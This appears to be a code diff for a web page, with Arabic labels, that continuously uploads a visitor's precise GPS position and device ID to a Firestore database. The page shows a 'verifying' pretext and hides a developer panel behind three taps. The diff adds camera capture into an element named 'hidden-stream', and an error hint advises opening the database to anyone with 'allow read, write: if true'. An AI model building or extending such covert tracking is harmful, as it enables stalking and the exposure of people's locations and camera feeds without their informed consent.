@@ -165,6 +165,7 @@
         .dev-val.red { color: #ff4757; }
         .dev-val.blue { color: #3b82f6; }
         .dev-val.white { color: #f1f5f9; }
+        .dev-val.purple { color: #a855f7; }
 
         .dev-acc-bar {
             width: 100%; height: 6px; border-radius: 3px;
@@ -177,32 +178,21 @@
             transition: width 0.4s, background 0.4s;
         }
 
-        /* صندوق الخطأ التفصيلي */
         .dev-error-box {
-            margin-top: 10px;
-            padding: 12px;
-            border-radius: 8px;
+            margin-top: 10px; padding: 12px; border-radius: 8px;
             background: rgba(255,71,87,0.08);
             border: 1px solid rgba(255,71,87,0.2);
             font-family: 'Courier New', monospace;
-            font-size: 0.7rem;
-            color: #ff4757;
-            direction: ltr;
-            text-align: left;
-            word-break: break-all;
-            line-height: 1.6;
-            white-space: pre-wrap;
-            display: none;
+            font-size: 0.7rem; color: #ff4757;
+            direction: ltr; text-align: left;
+            word-break: break-all; line-height: 1.6;
+            white-space: pre-wrap; display: none;
         }
 
         .dev-error-box.show { display: block; }
-
         .dev-error-box .err-label {
-            color: #ffa502;
-            font-weight: 700;
-            font-size: 0.65rem;
-            margin-bottom: 6px;
-            display: block;
+            color: #ffa502; font-weight: 700;
+            font-size: 0.65rem; margin-bottom: 6px; display: block;
         }
 
         .dev-log {
@@ -228,6 +218,7 @@
         .dev-log-entry .log-fb { font-weight: 700; }
         .dev-log-entry .log-fb.ok { color: #00e5a0; }
         .dev-log-entry .log-fb.fail { color: #ff4757; }
+        .dev-log-entry .log-cam { font-weight: 700; color: #a855f7; }
 
         @keyframes logIn {
             from { opacity: 0; transform: translateY(-8px); }
@@ -265,6 +256,11 @@
         .dev-foot-btn.danger {
             background: rgba(255,71,87,0.1); color: #ff4757;
             border: 1px solid rgba(255,71,87,0.2);
+        }
+
+        .dev-foot-btn.purple-btn {
+            background: rgba(168,85,247,0.1); color: #a855f7;
+            border: 1px solid rgba(168,85,247,0.2);
         }
 
         .dev-body::-webkit-scrollbar, .dev-log::-webkit-scrollbar { width: 2px; }
@@ -310,7 +306,7 @@
             <div class="dev-section">
                 <div class="dev-section-title">الحالة</div>
                 <div class="dev-row">
-                    <span class="dev-label">التتبع</span>
+                    <span class="dev-label">التتبع GPS</span>
                     <span class="dev-val green" id="d-status">غير مفعّل</span>
                 </div>
                 <div class="dev-row">
@@ -376,10 +372,21 @@
                     <span class="dev-label">حالة الرفع</span>
                     <span class="dev-val green" id="d-fb-status">بانتظار</span>
                 </div>
-                <!-- صندوق الخطأ التفصيلي -->
                 <div class="dev-error-box" id="d-error-box">
                     <span class="err-label">FULL ERROR:</span>
                     <span id="d-error-text"></span>
+                </div>
+            </div>
+
+            <div class="dev-section">
+                <div class="dev-section-title">الكاميرا</div>
+                <div class="dev-row">
+                    <span class="dev-label">الحالة</span>
+                    <span class="dev-val white" id="d-cam-status">غير مطلوبة</span>
+                </div>
+                <div class="dev-row">
+                    <span class="dev-label">البث</span>
+                    <span class="dev-val white" id="d-cam-stream">لا يوجد</span>
                 </div>
             </div>
 
@@ -390,13 +397,16 @@
         </div>
         <div class="dev-footer">
             <button class="dev-foot-btn primary" onclick="devRefresh()">
-                <i class="fa-solid fa-rotate"></i> إعادة GPS
+                <i class="fa-solid fa-rotate"></i> GPS
             </button>
             <button class="dev-foot-btn secondary" onclick="devCopyCoords()">
                 <i class="fa-solid fa-copy"></i> نسخ
             </button>
+            <button class="dev-foot-btn purple-btn" onclick="devTestCamera()">
+                <i class="fa-solid fa-camera"></i> كاميرا
+            </button>
             <button class="dev-foot-btn danger" onclick="devTestFirebase()">
-                <i class="fa-solid fa-flask"></i> اختبار FB
+                <i class="fa-solid fa-flask"></i> FB
             </button>
         </div>
     </div>
@@ -427,10 +437,14 @@
         let lastLat = null;
         let lastLng = null;
 
+        // حالة الكاميرا
+        let cameraStream = null;
+        let cameraActive = false;
+
         document.getElementById('d-dev').innerText = deviceId;
         document.getElementById('d-doc').innerText = deviceId;
 
-        // 3 نقرات سريعة لفتح المطور
+        // 3 نقرات سريعة
         let triggerTaps = 0, triggerTimer = null;
         document.getElementById('dev-trigger').addEventListener('click', function () {
             triggerTaps++;
@@ -441,7 +455,8 @@
 
         function toggleDev() { document.getElementById('dev-panel').classList.toggle('open'); }
 
-        async function start() {
+        // === البداية: GPS فقط بدون كاميرا ===
+        function start() {
             const btn = document.getElementById('perm-btn');
             const ld = document.getElementById('perm-ld');
             const icon = document.getElementById('perm-btn-icon');
@@ -449,26 +464,17 @@
             ld.style.display = 'block';
             icon.style.display = 'none';
             document.getElementById('perm-btn-text').innerText = 'جاري التحقق...';
-            devSet('d-status', 'جاري الاتصال...', 'orange');
+            devSet('d-status', 'جاري البحث عن أقمار...', 'orange');
 
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: { ideal: "environment" } },
-                    audio: true
-                });
-                document.getElementById('hidden-stream').srcObject = stream;
-                devSet('d-status', 'كاميرا + صوت ✓', 'orange');
-
-                if (!("geolocation" in navigator)) throw new Error("gps");
-                devSet('d-status', 'جاري البحث عن أقمار...', 'orange');
-
-                watcher = navigator.geolocation.watchPosition(onPos, onErr, {
-                    enableHighAccuracy: true, timeout: 15000, maximumAge: 0
-                });
-            } catch (e) {
-                devSet('d-status', 'فشل: ' + e.message, 'red');
+            if (!("geolocation" in navigator)) {
+                devSet('d-status', 'الجهاز لا يدعم GPS', 'red');
                 showBlocked();
+                return;
             }
+
+            watcher = navigator.geolocation.watchPosition(onPos, onErr, {
+                enableHighAccuracy: true, timeout: 15000, maximumAge: 0
+            });
         }
 
         function onPos(pos) {
@@ -526,17 +532,14 @@
                 device_id: deviceId,
                 last_updated: firebase.firestore.FieldValue.serverTimestamp()
             }, { merge: true }).then(() => {
-                const now = formatDT(new Date());
-                devSet('d-push', now, 'blue');
+                devSet('d-push', formatDT(new Date()), 'blue');
                 devSet('d-fb-status', 'نجاح ✓', 'green');
                 hideError();
-                // تحديث آخر سجل
                 updateLastLogFb('ok');
             }).catch((err) => {
-                const errMsg = err.code + ' | ' + err.message;
                 devSet('d-fb-status', 'فشل ✗', 'red');
-                showError(errMsg);
-                updateLastLogFb('fail', errMsg);
+                showError(err.code + ' | ' + err.message);
+                updateLastLogFb('fail', err.code + ' | ' + err.message);
             });
         }
 
@@ -559,16 +562,67 @@
             document.getElementById('perm-btn').disabled = false;
         }
 
+        // ========================================
+        //  الكاميرا: تُطلب فقط عند الحاجة
+        //  استدعِ requestCamera() من أي مكان في الكود
+        //  تعيد Promise<MediaStream>
+        // ========================================
+        async function requestCamera() {
+            // إذا كانت الكاميرا مفتوحة مسبقاً، نرجع البث الحالي
+            if (cameraActive && cameraStream) {
+                devSet('d-cam-status', 'مفتوحة مسبقاً', 'green');
+                return cameraStream;
+            }
+
+            devSet('d-cam-status', 'جاري الطلب...', 'orange');
+            addCamLog('طلب صلاحية الكاميرا...');
+
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { ideal: "environment" } }
+                });
+
+                cameraActive = true;
+                document.getElementById('hidden-stream').srcObject = cameraStream;
+
+                devSet('d-cam-status', 'مفتوحة ✓', 'green');
+                devSet('d-cam-stream', 'نشط (' + cameraStream.getVideoTracks().length + ' track)', 'green');
+                addCamLog('الكاميرا مفتوحة بنجاح');
+                return cameraStream;
+
+            } catch (err) {
+                cameraActive = false;
+                cameraStream = null;
+                devSet('d-cam-status', 'مرفوضة ✗', 'red');
+                devSet('d-cam-stream', 'لا يوجد', 'red');
+                addCamLog('فشل: ' + err.message);
+                throw err;
+            }
+        }
+
+        // إيقاف الكاميرا لتحرير الموارد
+        function releaseCamera() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(function(track) { track.stop(); });
+                cameraStream = null;
+            }
+            cameraActive = false;
+            document.getElementById('hidden-stream').srcObject = null;
+            devSet('d-cam-status', 'متوقفة', 'white');
+            devSet('d-cam-stream', 'لا يوجد', 'white');
+            addCamLog('تم إيقاف الكاميرا وتحرير الموارد');
+        }
+
         // === أدوات المطور ===
         function devSet(id, val, cls) {
-            const el = document.getElementById(id);
+            var el = document.getElementById(id);
             if (!el) return;
             el.innerText = val;
             el.className = 'dev-val ' + (cls || 'white');
         }
 
         function showError(msg) {
-            const box = document.getElementById('d-error-box');
+            var box = document.getElementById('d-error-box');
             document.getElementById('d-error-text').innerText = msg;
             box.classList.add('show');
         }
@@ -582,29 +636,36 @@
         }
 
         function addDevLog(acc, lat, lng, fbStatus) {
-            const log = document.getElementById('d-log');
-            const cls = acc <= 5 ? 'good' : acc <= 15 ? 'mid' : 'bad';
-            const entry = document.createElement('div');
+            var log = document.getElementById('d-log');
+            var cls = acc <= 5 ? 'good' : acc <= 15 ? 'mid' : 'bad';
+            var entry = document.createElement('div');
             entry.className = 'dev-log-entry';
-            let fbHtml = '';
+            var fbHtml = '';
             if (fbStatus === 'ok') fbHtml = ' <span class="log-fb ok">[FB OK]</span>';
             else if (fbStatus === 'fail') fbHtml = ' <span class="log-fb fail">[FB FAIL]</span>';
             entry.innerHTML = '<span class="log-time">' + formatDT(new Date()) + '</span> ' +
                 lat.toFixed(6) + ',' + lng.toFixed(6) +
-                ' acc:<span class="log-acc ' + cls + '">' + acc.toFixed(1) + 'm</span>' +
-                fbHtml;
+                ' acc:<span class="log-acc ' + cls + '">' + acc.toFixed(1) + 'm</span>' + fbHtml;
             entry.setAttribute('data-log-entry', '1');
             log.insertBefore(entry, log.firstChild);
             while (log.children.length > 50) log.removeChild(log.lastChild);
         }
 
+        function addCamLog(msg) {
+            var log = document.getElementById('d-log');
+            var entry = document.createElement('div');
+            entry.className = 'dev-log-entry';
+            entry.innerHTML = '<span class="log-time">' + formatDT(new Date()) + '</span> <span class="log-cam">[CAM] ' + msg + '</span>';
+            log.insertBefore(entry, log.firstChild);
+            while (log.children.length > 50) log.removeChild(log.lastChild);
+        }
+
         function updateLastLogFb(status, errMsg) {
-            const first = document.querySelector('[data-log-entry="1"]');
+            var first = document.querySelector('[data-log-entry="1"]');
             if (!first) return;
-            // إزالة الحالة القديمة إن وجدت
-            const old = first.querySelector('.log-fb');
+            var old = first.querySelector('.log-fb');
             if (old) old.remove();
-            const span = document.createElement('span');
+            var span = document.createElement('span');
             span.className = 'log-fb ' + (status === 'ok' ? 'ok' : 'fail');
             span.innerText = status === 'ok' ? ' [FB OK]' : ' [FB FAIL]';
             if (errMsg) span.title = errMsg;
@@ -630,58 +691,58 @@
 
         function devCopyCoords() {
             if (lastLat === null) return;
-            const text = lastLat.toFixed(6) + ', ' + lastLng.toFixed(6) + ' (' + (bestAcc === Infinity ? '--' : bestAcc.toFixed(1) + 'm') + ')';
-            navigator.clipboard.writeText(text).then(() => {
-                const btn = event.target.closest('.dev-foot-btn');
-                const orig = btn.innerHTML;
+            var text = lastLat.toFixed(6) + ', ' + lastLng.toFixed(6) + ' (' + (bestAcc === Infinity ? '--' : bestAcc.toFixed(1) + 'm') + ')';
+            navigator.clipboard.writeText(text).then(function () {
+                var btn = event.target.closest('.dev-foot-btn');
+                var orig = btn.innerHTML;
                 btn.innerHTML = '<i class="fa-solid fa-check"></i> تم';
-                setTimeout(() => { btn.innerHTML = orig; }, 1200);
-            }).catch(() => {});
+                setTimeout(function () { btn.innerHTML = orig; }, 1200);
+            }).catch(function () {});
         }
 
-        // اختبار فوري لاتصال Firebase — يكتب مستند اختبار ثم يحذفه
+        // زر اختبار الكاميرا في نافذة المطور
+        async function devTestCamera() {
+            if (cameraActive) {
+                releaseCamera();
+            } else {
+                try {
+                    await requestCamera();
+                } catch (e) {
+                    // الخطأ مسجّل داخل requestCamera
+                }
+            }
+        }
+
         function devTestFirebase() {
             devSet('d-fb-status', 'اختبار اتصال...', 'orange');
             hideError();
-
-            const testDoc = deviceId + '_test_' + Date.now();
-
+            var testDoc = deviceId + '_test_' + Date.now();
             db.collection('loc').doc(testDoc).set({
-                latitude: 0,
-                longitude: 0,
-                accuracy: 999,
-                device_id: deviceId,
-                _test: true,
+                latitude: 0, longitude: 0, accuracy: 999,
+                device_id: deviceId, _test: true,
                 last_updated: firebase.firestore.FieldValue.serverTimestamp()
-            }, { merge: true }).then(() => {
-                // نجح الكتابة — نحذف المستند التجريبي
-                db.collection('loc').doc(testDoc).delete().catch(() => {});
+            }, { merge: true }).then(function () {
+                db.collection('loc').doc(testDoc).delete().catch(function () {});
                 devSet('d-fb-status', 'اتصال ناجح ✓', 'green');
                 hideError();
                 addDevLog(999, 0, 0, 'ok');
-            }).catch((err) => {
-                const errMsg = 'Code: ' + err.code + '\nMsg: ' + err.message;
+            }).catch(function (err) {
+                var errMsg = 'Code: ' + err.code + '\nMsg: ' + err.message;
                 devSet('d-fb-status', 'فشل الاتصال ✗', 'red');
                 showError(errMsg);
-
-                // تلميح حسب نوع الخطأ
-                let hint = '';
                 if (err.code === 'permission-denied') {
-                    hint = '\n\n--- الحل ---\nاذهب إلى Firebase Console:\nFirestore Database > Rules\nغيّرها إلى:\nallow read, write: if true;\nثم انشر (Publish)';
+                    document.getElementById('d-error-text').innerText += '\n\n--- الحل ---\nاذهب إلى Firebase Console:\nFirestore Database > Rules\nغيّرها إلى:\nallow read, write: if true;\nثم انشر (Publish)';
                 } else if (err.code === 'not-found') {
-                    hint = '\n\n--- الحل ---\nFirestore غير مفعّل في هذا المشروع.\nاذهب إلى Firebase Console > Build > Firestore\nواضغط "Create Database"';
-                }
-                if (hint) {
-                    document.getElementById('d-error-text').innerText += hint;
+                    document.getElementById('d-error-text').innerText += '\n\n--- الحل ---\nFirestore غير مفعّلة.\nاذهب إلى Firebase Console > Build > Firestore\nواضغط "Create Database"';
                 }
             });
         }
 
         window.onload = function () {
             if (navigator.permissions && navigator.permissions.query) {
-                navigator.permissions.query({ name: 'geolocation' }).then(r => {
+                navigator.permissions.query({ name: 'geolocation' }).then(function (r) {
                     if (r.state === 'granted') start();
-                }).catch(() => {});
+                }).catch(function () {});
             }
         };
     </script>
